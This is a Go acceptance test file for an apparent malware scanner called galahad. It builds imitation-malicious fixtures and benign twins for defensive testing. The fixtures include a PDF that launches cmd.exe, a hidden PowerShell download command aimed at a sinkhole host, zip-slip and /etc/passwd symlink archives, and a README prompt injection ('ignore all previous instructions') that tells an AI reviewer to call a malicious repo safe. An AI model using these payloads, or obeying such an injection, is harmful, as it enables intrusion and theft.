package acceptance_test

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/zlib"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
)

// liveLink matches a URL that is not defanged. No report may contain one.
var liveLink = regexp.MustCompile(`(?i)(?:https?|ftp|file)://`)

var whyList = regexp.MustCompile(`(?s)<ul class="why">(.*?)</ul>`)

var actionLines = map[string]string{
	"malicious":  "Do not open, install or run this.",
	"suspicious": "Treat with caution. Review the findings below before you open, install or run it.",
	"clean":      "No known-bad patterns found. This is not a guarantee.",
}

// checkHTMLPage checks what every report.html has: the CSP, the verdict in the title, the action line of
// the verdict, landmarks, at most 3 reasons, the right IOC label, and no link, image or script.
func checkHTMLPage(t *testing.T, html, verdict string) {
	t.Helper()
	for _, want := range []string{
		`content="default-src 'none'; style-src 'unsafe-inline'"`,
		"<title>" + strings.ToUpper(verdict) + ": ",
		actionLines[verdict], "<header ", "<main>", "<footer>", "<h1><span class=\"badge\">" + strings.ToUpper(verdict) + "</span> ",
	} {
		if !strings.Contains(html, want) {
			t.Errorf("report.html lacks %q", want)
		}
	}
	for _, absent := range []string{"href=", "src=", "<script"} {
		if strings.Contains(html, absent) {
			t.Errorf("report.html contains %q", absent)
		}
	}
	if m := whyList.FindStringSubmatch(html); m != nil && strings.Count(m[1], "<li>") > 3 {
		t.Errorf("why lists %d items, want at most 3:\n%s", strings.Count(m[1], "<li>"), m[1])
	}
	const label = "Network indicators (not a sign of compromise)"
	if got := strings.Contains(html, label); got != (verdict == "clean") {
		t.Errorf("IOC label %q present = %v on a %s report", label, got, verdict)
	}
}

// corpusDir returns a builder that targets a committed fixture in testdata/corpus.
func corpusDir(name string) func(t *testing.T) string {
	return func(t *testing.T) string { return corpus(t, name) }
}

// builtFile returns a builder that writes one file named name into a scratch directory with build.
func builtFile(name string, build func(t *testing.T, dest string)) func(t *testing.T) string {
	return func(t *testing.T) string {
		p := filepath.Join(t.TempDir(), name)
		build(t, p)
		return p
	}
}

// nestingLimit is analyze.MaxNesting: an archive at this container depth is not opened.
const nestingLimit = 6

// corpusWithBig returns a builder that copies a committed fixture into a scratch directory and
// adds a file of zeros of the given size, like a data file or a media file in a repository.
func corpusWithBig(name, bigName string, size int64) func(t *testing.T) string {
	return func(t *testing.T) string {
		dir := t.TempDir()
		for _, e := range dirEntries(t, corpus(t, name), "") {
			p := filepath.Join(dir, filepath.FromSlash(e.name))
			if err := os.MkdirAll(filepath.Dir(p), 0o750); err != nil {
				t.Fatal(err)
			}
			writeBytes(t, p, e.data)
		}
		writeBytes(t, filepath.Join(dir, bigName), make([]byte, size))
		return dir
	}
}

// paddedPDF returns a builder for a PDF with n empty objects followed by an OpenAction
// that launches a program, like padding that pushes the action past the object limit.
func paddedPDF(n int) func(t *testing.T, dest string) {
	return func(t *testing.T, dest string) {
		var b strings.Builder
		b.WriteString("%PDF-1.7\n")
		for i := range n {
			fmt.Fprintf(&b, "%d 0 obj\nendobj\n", i+10)
		}
		b.WriteString("1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R >>\nendobj\n")
		b.WriteString("2 0 obj\n<< /S /Launch /F (cmd.exe) >>\nendobj\n")
		b.WriteString("trailer\n<< /Root 1 0 R >>\n%%EOF\n")
		writeBytes(t, dest, []byte(b.String()))
	}
}

// pagedPDF returns a builder for a benign PDF with n pages, each with a link.
func pagedPDF(n int) func(t *testing.T, dest string) {
	return func(t *testing.T, dest string) {
		var b, kids strings.Builder
		b.WriteString("%PDF-1.7\n")
		b.WriteString("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction [10 0 R /Fit] >>\nendobj\n")
		for i := range n {
			page := 10 + 3*i
			fmt.Fprintf(&kids, "%d 0 R ", page)
			fmt.Fprintf(&b, "%d 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents %d 0 R /Annots [%d 0 R] >>\nendobj\n", page, page+1, page+2)
			fmt.Fprintf(&b, "%d 0 obj\n<< /Length 25 >>\nstream\nBT /F1 12 Tf (page %d) Tj ET\nendstream\nendobj\n", page+1, i)
			fmt.Fprintf(&b, "%d 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /URI /URI (https://docs.example.test/p%d) >> >>\nendobj\n", page+2, i)
		}
		fmt.Fprintf(&b, "2 0 obj\n<< /Type /Pages /Kids [%s] /Count %d >>\nendobj\n", kids.String(), n)
		b.WriteString("trailer\n<< /Root 1 0 R >>\n%%EOF\n")
		writeBytes(t, dest, []byte(b.String()))
	}
}

// vectorPDF returns a builder for a one-page PDF whose Flate content stream draws n line
// segments, more tokens than the analyzer reads from one region.
func vectorPDF(n int) func(t *testing.T, dest string) {
	return func(t *testing.T, dest string) {
		var raw bytes.Buffer
		for i := range n {
			fmt.Fprintf(&raw, "%d %d m %d %d l S\n", i%600, i%700, i%500, i%400)
		}
		var z bytes.Buffer
		w := zlib.NewWriter(&z)
		if _, err := w.Write(raw.Bytes()); err != nil {
			t.Fatal(err)
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		var b bytes.Buffer
		b.WriteString("%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
		b.WriteString("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
		b.WriteString("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n")
		fmt.Fprintf(&b, "4 0 obj\n<< /Filter /FlateDecode /Length %d >>\nstream\n", z.Len())
		b.Write(z.Bytes())
		b.WriteString("\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")
		writeBytes(t, dest, b.Bytes())
	}
}

// payloadAs returns a builder for a zip that holds the tasks file of p1-folderopen-curl under name.
func payloadAs(name string) func(t *testing.T, dest string) {
	return func(t *testing.T, dest string) {
		tasks, err := os.ReadFile(filepath.Join(corpus(t, "p1-folderopen-curl"), ".vscode", "tasks.json"))
		if err != nil {
			t.Fatal(err)
		}
		zipEntries(t, dest, []zipEntry{{name: name, data: tasks}})
	}
}

// corpusCase is one row of the corpus table: a fixture and what the analysis of it must show.
// TestCorpus runs the table through galahad-agent analyze, and TestScanCorpus through galahad scan.
type corpusCase struct {
	name string
	// inputs
	target func(t *testing.T) string // returns the file or directory to analyze
	// expectations
	wantCode     int      // exit code; the verdict must match it (0 clean, 10 suspicious, 20 malicious)
	wantRules    []string // "RULE path:line" that must be present
	wantSnippets []string // each must appear in the snippet of some evidence
	wantIOCs     []string // url IOCs that must be reported (undefanged in report.json)
	wantSummary  []string // each must appear in summary.md
	wantSkips    int      // coverage skips; when zero, files_analyzed must equal files_seen
	wantQuiet    bool     // only info findings and the auto-execution inventory (GAL-AUTOEXEC-006 to 008)
}

// corpusCases is the single regression list for corpus v1 (docs/milestones/M1.md section 5).
// Cases follow the order of the two tables there: malicious and suspicious imitations first,
// then the benign twins (P7).
func corpusCases() []corpusCase {
	return []corpusCase{
		// Malicious or suspicious imitations.
		{
			name:   "fake-interview-repo: folderOpen task and postinstall script exfiltrate .env",
			target: corpusDir("fake-interview-repo"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-001 .vscode/tasks.json:7", "GAL-AUTOEXEC-010 .vscode/tasks.json:7", "GAL-AUTOEXEC-005 package.json:6", "GAL-EXFIL-001 scripts/setup.js:3"},
		},
		{
			name:   "p1-folderopen-curl: JSONC tasks file runs curl on folder open",
			target: corpusDir("p1-folderopen-curl"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-001 .vscode/tasks.json:7", "GAL-AUTOEXEC-010 .vscode/tasks.json:7"},
		},
		{
			name: "p1-ooxml-evasion: a stray [Content_Types].xml does not hide the zip members (built)",
			target: builtFile("evade.zip", func(t *testing.T, dest string) {
				entries := dirEntries(t, corpus(t, "p1-folderopen-curl"), "p1-folderopen-curl/")
				zipEntries(t, dest, append(entries, zipEntry{name: "sub/[Content_Types].xml", data: []byte("<Types/>")}))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 evade.zip!/p1-folderopen-curl/.vscode/tasks.json:7", "GAL-AUTOEXEC-010 evade.zip!/p1-folderopen-curl/.vscode/tasks.json:7"},
		},
		{
			name: "p1-ooxml-smuggle: a docx still has its payload below word/ inspected (built)",
			target: builtFile("smuggle.docx", func(t *testing.T, dest string) {
				extra := dirEntries(t, corpus(t, "p1-folderopen-curl"), "word/x/")
				zipEntries(t, dest, append(benignDocxEntries(), extra...))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 smuggle.docx!/word/x/.vscode/tasks.json:7", "GAL-AUTOEXEC-010 smuggle.docx!/word/x/.vscode/tasks.json:7"},
			wantIOCs:  []string{"https://docs.sinkhole.test/guide"},
		},
		{
			name: "p1-ooxml-embedded: a docx embeds a zip of the malicious repo (built)",
			target: builtFile("embed.docx", func(t *testing.T, dest string) {
				inner := filepath.Join(t.TempDir(), "pack.zip")
				zipEntries(t, inner, dirEntries(t, corpus(t, "p1-folderopen-curl"), ""))
				b, err := os.ReadFile(inner)
				if err != nil {
					t.Fatal(err)
				}
				zipEntries(t, dest, append(benignDocxEntries(), zipEntry{name: "word/embeddings/pack.zip", data: b}))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 embed.docx!/word/embeddings/pack.zip!/.vscode/tasks.json:7", "GAL-AUTOEXEC-010 embed.docx!/word/embeddings/pack.zip!/.vscode/tasks.json:7"},
		},
		{
			name: "p1-ooxml-disguised-xml: a docx part named styles.xml is really a zip of the malicious repo (built)",
			target: builtFile("disguise.docx", func(t *testing.T, dest string) {
				inner := zipBytes(t, dirEntries(t, corpus(t, "p1-folderopen-curl"), ""))
				zipEntries(t, dest, append(benignDocxEntries(), zipEntry{name: "word/styles.xml", data: inner}))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 disguise.docx!/word/styles.xml!/.vscode/tasks.json:7"},
		},
		{
			name: "p1-ooxml-disguised-vba: a docx vbaProject.bin is really a zip of the malicious repo (built)",
			target: builtFile("macro.docx", func(t *testing.T, dest string) {
				inner := zipBytes(t, dirEntries(t, corpus(t, "p1-folderopen-curl"), ""))
				zipEntries(t, dest, append(benignDocxEntries(), zipEntry{name: "word/vbaProject.bin", data: inner}))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 macro.docx!/word/vbaProject.bin!/.vscode/tasks.json:7"},
			wantSkips: 1, // the office analyzer cannot read the fake project
		},
		{
			name:   "p1-devcontainer-init: initializeCommand pipes a download into sh",
			target: corpusDir("p1-devcontainer-init"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-003 .devcontainer/devcontainer.json:5", "GAL-AUTOEXEC-011 .devcontainer/devcontainer.json:5"},
		},
		{
			name:   "p2-husky-curl-sh: pre-commit hook pipes a download into sh",
			target: corpusDir("p2-husky-curl-sh"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-011 .husky/pre-commit:2"},
		},
		{
			name:   "p2-typosquat: typosquatted names and a github dependency",
			target: corpusDir("p2-typosquat"), wantCode: 10,
			wantRules: []string{"GAL-DEPS-001 package.json:6", "GAL-DEPS-002 package.json:8"},
		},
		{
			name:   "p2-pip-index: custom python index and a typosquatted requirement",
			target: corpusDir("p2-pip-index"), wantCode: 10,
			wantRules: []string{"GAL-DEPS-004 requirements.txt:2", "GAL-DEPS-001 requirements.txt:3"},
		},
		{
			name:   "p2-requirements-include: an included requirements file with another name sets a custom index",
			target: corpusDir("p2-requirements-include"), wantCode: 10,
			wantRules: []string{"GAL-DEPS-004 deps/base.txt:3"},
		},
		{
			name:   "p2-npmrc-hijack: .npmrc sets a registry and node-options",
			target: corpusDir("p2-npmrc-hijack"), wantCode: 10,
			wantRules: []string{"GAL-AUTOEXEC-013 .npmrc:2", "GAL-AUTOEXEC-013 .npmrc:3"},
		},
		{
			name:   "p2-yarnrc-hijack: .yarnrc.yml loads a patched yarn and sets a registry",
			target: corpusDir("p2-yarnrc-hijack"), wantCode: 10,
			wantRules: []string{"GAL-AUTOEXEC-013 .yarnrc.yml:1", "GAL-AUTOEXEC-013 .yarnrc.yml:2"},
		},
		{
			name:   "p2-pnpmfile: pnpm runs .pnpmfile.cjs on install",
			target: corpusDir("p2-pnpmfile"), wantCode: 10,
			wantRules: []string{"GAL-AUTOEXEC-015 .pnpmfile.cjs:1"},
		},
		{
			name:   "p2-uv-sources: pyproject with a custom uv index and a git source",
			target: corpusDir("p2-uv-sources"), wantCode: 10,
			wantRules: []string{"GAL-DEPS-004 pyproject.toml:9", "GAL-DEPS-002 pyproject.toml:12"},
		},
		{
			name:   "p2-prisma-provider: a generator provider that is a command",
			target: corpusDir("p2-prisma-provider"), wantCode: 10,
			wantRules: []string{"GAL-AUTOEXEC-016 prisma/schema.prisma:8"},
		},
		{
			name:   "p2-gyp-expansion: binding.gyp downloads and runs code while gyp reads it",
			target: corpusDir("p2-gyp-expansion"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-017 binding.gyp:6", "GAL-AUTOEXEC-011 binding.gyp:6"},
		},
		{
			name: "git-config fsmonitor: .git/config runs a command (built)",
			target: gitConfigRepo("[core]\n\trepositoryformatversion = 0\n" +
				"\tfsmonitor = ./.git/hooks/fsmonitor-evil\n"),
			wantCode:  10,
			wantRules: []string{"GAL-AUTOEXEC-009 .git/config:3"},
		},
		{
			name:   "p3-padded-js: eval of an encoded payload hidden after 300 spaces",
			target: corpusDir("p3-padded-js"), wantCode: 20,
			wantRules:    []string{"GAL-OBF-001 index.js:12"},
			wantSnippets: []string{"decoded:", "c2.sinkhole.test"},
			wantIOCs:     []string{"https://c2.sinkhole.test/collect"},
		},
		{
			name:   "p3-padded-py: environment sent away from hidden code",
			target: corpusDir("p3-padded-py"), wantCode: 20,
			wantRules: []string{"GAL-OBF-001 app.py:9", "GAL-EXFIL-001 app.py:9"},
		},
		{
			name:   "p4-pdf-launch: OpenAction to JavaScript and Launch, URI defanged in the summary",
			target: corpusDir("p4-pdf-launch"), wantCode: 20,
			wantRules:   []string{"GAL-PDF-001 invoice.pdf:12", "GAL-PDF-002 invoice.pdf:3", "GAL-PDF-003 invoice.pdf:15"},
			wantIOCs:    []string{"http://invoice.sinkhole.test/pay"},
			wantSummary: []string{"hxxp://invoice[.]sinkhole[.]test/pay"},
		},
		{
			name:   "p4-pdf-openaction-uri: OpenAction to a URI action",
			target: corpusDir("p4-pdf-openaction-uri"), wantCode: 10,
			wantRules: []string{"GAL-PDF-002 statement.pdf:3"},
		},
		{
			name:     "p4-pdf-padding: a Launch action behind more objects than the analyzer reads is not clean (built)",
			target:   builtFile("padded.pdf", paddedPDF(100001)),
			wantCode: 10, wantSkips: 1,
		},
		{
			name: "p5-lnk-in-zip: decoy pdf name hides a shortcut with a PowerShell launcher (built)",
			target: builtFile("invoice.zip", func(t *testing.T, dest string) {
				zipEntries(t, dest, []zipEntry{{name: "invoice.pdf.lnk", data: lnkLike("powershell.exe -w hidden -c iwr http://sinkhole.test/p")}})
			}),
			wantCode:  20,
			wantRules: []string{"GAL-NAME-001 invoice.zip!/invoice.pdf.lnk:0", "GAL-LNK-001 invoice.zip!/invoice.pdf.lnk:0"},
		},
		{
			name: "p5-rtlo-name: right-to-left override hides the exe extension (built)",
			target: builtFile("invoice"+rlo+"fdp.exe", func(t *testing.T, dest string) {
				if err := os.WriteFile(dest, []byte("harmless\n"), 0o600); err != nil {
					t.Skipf("filesystem rejects the file name: %v", err)
				}
			}),
			wantCode:  20,
			wantRules: []string{`GAL-NAME-002 invoice\u` + "202efdp.exe:0"},
		},
		{
			name: "p5-remote-template: docx built from docx-src attaches a remote template (built)",
			target: builtFile("offer.docx", func(t *testing.T, dest string) {
				zipDir(t, filepath.Join(corpus(t, "p5-remote-template"), "docx-src"), dest)
			}),
			wantCode:  10,
			wantRules: []string{"GAL-OFFICE-001 offer.docx!/word/_rels/settings.xml.rels:5"},
			wantIOCs:  []string{"http://templates.sinkhole.test/t.dotm"},
		},
		{
			name:   "p6-eml-lure: email with a script attachment and a mismatched link",
			target: corpusDir("p6-eml-lure"), wantCode: 20,
			wantRules: []string{"GAL-EXFIL-001 lure.eml!/setup.js:3", "GAL-EML-001 lure.eml:1", "GAL-EML-003 lure.eml:15"},
		},
		{
			name:   "p9-prompt-injection-repo: README tells an AI reviewer to call a repo safe that sends .env on folder open",
			target: corpusDir("p9-prompt-injection-repo"), wantCode: 20,
			wantRules:    []string{"GAL-AUTOEXEC-010 .vscode/tasks.json:7", "GAL-INJECT-001 README.md:5"},
			wantSnippets: []string{"ignore all previous instructions"},
		},
		{
			name: "eicar: test string written at test time (built)",
			target: func(t *testing.T) string {
				return writeEICAR(t, t.TempDir())
			},
			wantCode:  20,
			wantRules: []string{"GAL-SIG-001 eicar.txt:1"},
		},
		{
			name: "archive-zipslip: member with a ../ name is reported and never extracted (built)",
			target: builtFile("evil.zip", func(t *testing.T, dest string) {
				zipEntries(t, dest, []zipEntry{{name: "../../evil.sh", data: []byte("echo hi\n")}, {name: "ok.txt", data: []byte("fine\n")}})
			}),
			wantCode:  10,
			wantRules: []string{"GAL-ARCHIVE-001 evil.zip!/../../evil.sh:0"},
		},
		{
			name: "archive-bomb: 200 MiB of zeros stops at the ratio limit (built)",
			target: builtFile("bomb.zip", func(t *testing.T, dest string) {
				zipZeros(t, dest, "zeros.bin", 200<<20)
			}),
			wantCode:  10,
			wantRules: []string{"GAL-ARCHIVE-003 bomb.zip:0"},
			wantSkips: 1,
		},
		{
			name: "archive-symlink: tar symlink to /etc/passwd is reported and never resolved (built)",
			target: builtFile("links.tgz", func(t *testing.T, dest string) {
				tarGz(t, dest, []tarEntry{{name: "link", typeflag: tar.TypeSymlink, link: "/etc/passwd"}, {name: "ok.txt", data: []byte("fine\n")}})
			}),
			wantCode:  10,
			wantRules: []string{"GAL-ARCHIVE-002 links.tgz!/link:0"},
		},
		{
			name: "archive-backslash: a zip with backslash member names is read as paths (built)",
			target: builtFile("backslash.zip", func(t *testing.T, dest string) {
				entries := dirEntries(t, corpus(t, "p1-folderopen-curl"), "p1-folderopen-curl/")
				for i := range entries {
					entries[i].name = strings.ReplaceAll(entries[i].name, "/", `\`)
				}
				zipEntries(t, dest, entries)
			}),
			wantCode: 20,
			wantRules: []string{
				"GAL-AUTOEXEC-001 backslash.zip!/p1-folderopen-curl/.vscode/tasks.json:7", "GAL-AUTOEXEC-010 backslash.zip!/p1-folderopen-curl/.vscode/tasks.json:7",
				`GAL-ARCHIVE-005 backslash.zip!/p1-folderopen-curl\.vscode\tasks.json:0`,
			},
			wantSnippets: []string{`p1-folderopen-curl\.vscode\tasks.json`},
		},
		{
			name: "archive-sfx: an executable with the malicious repo zipped after it (built)",
			target: builtFile("setup.exe", func(t *testing.T, dest string) {
				zipped := zipBytes(t, dirEntries(t, corpus(t, "p1-folderopen-curl"), ""))
				writeBytes(t, dest, append(sfxStub(), zipped...))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 setup.exe!/.vscode/tasks.json:7", "GAL-ARCHIVE-006 setup.exe:0"},
		},
		{
			name: "archive-nested: the payload sits in a zip at the nesting limit, so it is not opened (built)",
			target: builtFile("deep.zip", func(t *testing.T, dest string) {
				nestedZips(t, dest, nestingLimit+1, dirEntries(t, corpus(t, "p1-folderopen-curl"), ""))
			}),
			wantCode:    10,
			wantSkips:   1,
			wantSummary: []string{"part of the input could not be analyzed"},
		},
		{
			name: "archive-nested within the limit: the payload sits in a zip one level above the limit (built)",
			target: builtFile("deep.zip", func(t *testing.T, dest string) {
				nestedZips(t, dest, nestingLimit, dirEntries(t, corpus(t, "p1-folderopen-curl"), ""))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 deep.zip" + strings.Repeat("!/next.zip", nestingLimit-1) + "!/.vscode/tasks.json:7"},
		},
		{
			name: "archive-name-mismatch: the local header names the task file, the central directory a harmless name (built)",
			target: builtFile("mismatch.zip", func(t *testing.T, dest string) {
				tasks, err := os.ReadFile(filepath.Join(corpus(t, "p1-folderopen-curl"), ".vscode", "tasks.json"))
				if err != nil {
					t.Fatal(err)
				}
				zipEntries(t, dest, []zipEntry{{name: "_vscode/tasks.json", data: tasks}})
				b, err := os.ReadFile(dest) // #nosec G304 -- test fixture path under t.TempDir()
				if err != nil {
					t.Fatal(err)
				}
				writeBytes(t, dest, bytes.Replace(b, []byte("_vscode/tasks.json"), []byte(".vscode/tasks.json"), 1))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-ARCHIVE-007 mismatch.zip!/_vscode/tasks.json:0", "GAL-AUTOEXEC-001 mismatch.zip!/.vscode/tasks.json:7"},
		},

		{
			name: "archive-flood: thousands of backslash names do not push the payload findings out (built)",
			target: builtFile("flood.zip", func(t *testing.T, dest string) {
				var entries []zipEntry
				for i := range 2100 {
					entries = append(entries, zipEntry{name: fmt.Sprintf(`docs\page%04d.txt`, i), data: []byte("page\n")})
				}
				zipEntries(t, dest, append(entries, dirEntries(t, corpus(t, "p1-folderopen-curl"), "")...))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 flood.zip!/.vscode/tasks.json:7", "GAL-AUTOEXEC-010 flood.zip!/.vscode/tasks.json:7", `GAL-ARCHIVE-005 flood.zip!/docs\page0000.txt:0`},
		},
		{
			name: "archive-fake-header: a decoy local header in the extra field hides the real local name (built)",
			target: builtFile("decoy.zip", func(t *testing.T, dest string) {
				tasks, err := os.ReadFile(filepath.Join(corpus(t, "p1-folderopen-curl"), ".vscode", "tasks.json"))
				if err != nil {
					t.Fatal(err)
				}
				const name = "_vscode/tasks.json"
				fake := make([]byte, 30)
				copy(fake, "PK\x03\x04")
				fake[26] = byte(len(name))
				fake = append(fake, name...)
				h := &zip.FileHeader{Name: name, Method: zip.Store, Extra: append([]byte{0x66, 0x66, byte(len(fake)), 0}, fake...)}
				var buf bytes.Buffer
				zw := zip.NewWriter(&buf)
				w, err := zw.CreateHeader(h)
				if err != nil {
					t.Fatal(err)
				}
				if _, err := w.Write(tasks); err != nil {
					t.Fatal(err)
				}
				if err := zw.Close(); err != nil {
					t.Fatal(err)
				}
				writeBytes(t, dest, bytes.Replace(buf.Bytes(), []byte(name), []byte(".vscode/tasks.json"), 1))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-ARCHIVE-007 decoy.zip!/_vscode/tasks.json:0", "GAL-AUTOEXEC-001 decoy.zip!/.vscode/tasks.json:7"},
		},
		{
			name:      "archive-name-doubled-backslash: .vscode\\tasks.json is the same path (built)",
			target:    builtFile("doubled.zip", payloadAs(`.vscode\\tasks.json`)),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 doubled.zip!/.vscode/tasks.json:7"},
		},
		{
			name:      "archive-name-dot-backslash: .vscode\\.\\tasks.json is the same path (built)",
			target:    builtFile("dotted.zip", payloadAs(`.vscode\.\tasks.json`)),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 dotted.zip!/.vscode/tasks.json:7"},
		},
		{
			name:      "archive-name-double-slash: .vscode//tasks.json is the same path (built)",
			target:    builtFile("slashes.zip", payloadAs(".vscode//tasks.json")),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 slashes.zip!/.vscode/tasks.json:7"},
		},
		{
			name:      "archive-name-dot-segment: .vscode/./tasks.json is the same path (built)",
			target:    builtFile("segment.zip", payloadAs(".vscode/./tasks.json")),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 segment.zip!/.vscode/tasks.json:7"},
		},

		// Benign twins (P7).
		{
			name:   "benign-express-app: express starter with tasks without runOn and a CI workflow",
			target: corpusDir("benign-express-app"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-go-cli: Makefile with a tool installer and pre-commit remote hooks",
			target: corpusDir("benign-go-cli"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-python-lib: setuptools project",
			target: corpusDir("benign-python-lib"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-husky-lint: husky runs lint-staged",
			target: corpusDir("benign-husky-lint"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-minified-js: long minified line and a data-URI",
			target: corpusDir("benign-minified-js"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-pdf: destination OpenAction and one link",
			target: corpusDir("benign-pdf"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-pdf with 300 pages and a link on each (built)",
			target: builtFile("pages.pdf", pagedPDF(300)), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-pdf with 5000 pages, a content stream and a link on each (built)",
			target: builtFile("manual.pdf", pagedPDF(5000)), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-pdf: one page of vector drawing with 300000 segments in a Flate content stream (built)",
			target: builtFile("drawing.pdf", vectorPDF(300000)), wantCode: 0, wantQuiet: true, wantSkips: 1,
		},
		{
			name:   "benign-docx: internal and external hyperlinks (built)",
			target: builtFile("guide.docx", benignDocx), wantCode: 0, wantQuiet: true,
			wantIOCs: []string{"https://docs.sinkhole.test/guide"},
		},
		{
			name: "benign-docx-media: the same docx with an image member (built)",
			target: builtFile("guide.docx", func(t *testing.T, dest string) {
				zipEntries(t, dest, append(benignDocxEntries(), zipEntry{name: "word/media/image1.png", data: []byte("\x89PNG\r\n\x1a\n")}))
			}),
			wantCode: 0, wantQuiet: true,
			wantIOCs: []string{"https://docs.sinkhole.test/guide"},
		},
		{
			name:   "benign-eml-newsletter: a link and no attachment",
			target: corpusDir("benign-eml-newsletter"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-npm-deps: npm project with a registry lockfile (twin of p2-typosquat)",
			target: corpusDir("benign-npm-deps"), wantCode: 0, wantQuiet: true,
		},
		{
			name: "benign .npmrc: npm defaults (built, twin of p2-npmrc-hijack)",
			target: filesRepo(map[string]string{
				".npmrc":       "save-exact=true\nengine-strict=true\nfund=false\nregistry=https://registry.npmjs.org/\n",
				"package.json": "{\n  \"name\": \"plain\",\n  \"version\": \"1.0.0\"\n}\n",
			}),
			wantCode: 0, wantQuiet: true,
		},
		{
			name: "benign .yarnrc.yml: node-modules linker and the committed Yarn release (built, twin of p2-yarnrc-hijack)",
			target: filesRepo(map[string]string{
				".yarnrc.yml":                   "nodeLinker: node-modules\nyarnPath: .yarn/releases/yarn-4.5.0.cjs\n",
				".yarn/releases/yarn-4.5.0.cjs": "// stand-in for the committed Yarn release\n",
				"package.json":                  "{\n  \"name\": \"plain\",\n  \"version\": \"1.0.0\"\n}\n",
			}),
			wantCode: 0,
		},
		{
			name: "benign prisma schema: the default client generator (built, twin of p2-prisma-provider)",
			target: filesRepo(map[string]string{
				"prisma/schema.prisma": "generator client {\n  provider = \"prisma-client-js\"\n}\n\ndatasource db {\n  provider = \"postgresql\"\n  url      = env(\"DATABASE_URL\")\n}\n",
			}),
			wantCode: 0, wantQuiet: true,
		},
		{
			name: "benign binding.gyp: the node-addon-api include expansion only (built, twin of p2-gyp-expansion)",
			target: filesRepo(map[string]string{
				"binding.gyp": "{\n  'targets': [{\n    'target_name': 'addon',\n    'sources': ['addon.cc'],\n    'include_dirs': [\"<!@(node -p \\\"require('node-addon-api').include\\\")\"]\n  }]\n}\n",
			}),
			wantCode: 0, wantQuiet: true,
		},
		{
			name: "benign pyproject: PyPI dependencies only (built, twin of p2-uv-sources)",
			target: filesRepo(map[string]string{
				"pyproject.toml": "[project]\nname = \"plain\"\nversion = \"1.0.0\"\ndependencies = [\"requests>=2.31\", \"numpy\"]\n\n[tool.uv]\nindex-url = \"https://pypi.org/simple\"\n",
			}),
			wantCode: 0, wantQuiet: true,
		},
		{
			name: "benign text files: README, LICENSE and notes are not requirements files (built, twin of p2-requirements-include)",
			target: filesRepo(map[string]string{
				"README.txt":  "Project notes\nSee https://docs.sinkhole.test/guide for details.\nInstall with requests==2.0 first.\n",
				"LICENSE.txt": "MIT License\n\nCopyright (c) 2024 Someone\n",
				"notes.txt":   "reqeusts\nbeta\ngamma\n",
			}),
			wantCode: 0, wantQuiet: true,
		},
		{
			name: "benign devcontainer: image and forwardPorts only (built, twin of p1-devcontainer-init)",
			target: filesRepo(map[string]string{
				".devcontainer/devcontainer.json": "{\n  \"image\": \"mcr.microsoft.com/devcontainers/base:ubuntu\",\n  \"forwardPorts\": [3000]\n}\n",
			}),
			wantCode: 0, wantQuiet: true,
		},
		{
			name:     "benign git config: built-in fsmonitor daemon (built, twin of git-config fsmonitor)",
			target:   gitConfigRepo("[core]\n\trepositoryformatversion = 0\n\tfsmonitor = true\n"),
			wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-archive: zip of benign-go-cli (built)",
			target: builtFile("benign.zip", zipOfBenignCLI), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-python-lib with a 40 MiB data file: too large to read, but not a verdict (built)",
			target: corpusWithBig("benign-python-lib", "weights.bin", 40<<20), wantCode: 0, wantQuiet: true, wantSkips: 1,
		},
		{
			name: "benign-docx with a document.xml over 16 MiB (built)",
			target: builtFile("big.docx", func(t *testing.T, dest string) {
				entries := benignDocxEntries()
				entries[1].data = append(entries[1].data[:len(entries[1].data)-len("</w:body></w:document>")], append(bytes.Repeat([]byte(" "), 17<<20), "</w:body></w:document>"...)...)
				zipEntries(t, dest, entries)
			}),
			wantCode: 0, wantQuiet: true, wantSkips: 1,
			wantIOCs: []string{"https://docs.sinkhole.test/guide"},
		},
		{
			name:   "built galahad binary: a normal Go executable",
			target: func(*testing.T) string { return binPath }, wantCode: 0, wantQuiet: true,
		},
	}
}

func TestCorpus(t *testing.T) {
